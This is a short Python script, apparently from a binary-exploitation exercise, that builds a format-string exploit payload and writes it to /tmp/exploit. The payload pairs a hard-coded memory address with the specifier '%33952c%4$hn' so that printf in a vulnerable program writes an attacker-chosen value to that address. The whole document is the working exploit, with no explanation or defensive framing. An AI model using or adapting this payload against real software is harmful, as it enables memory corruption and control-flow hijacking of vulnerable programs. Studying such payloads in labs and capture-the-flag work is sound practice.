payload = b"\x38\x98\x04\x08"
payload += b"%33952c%4$hn"

with open('/tmp/exploit', 'wb') as f:
    f.write(payload)
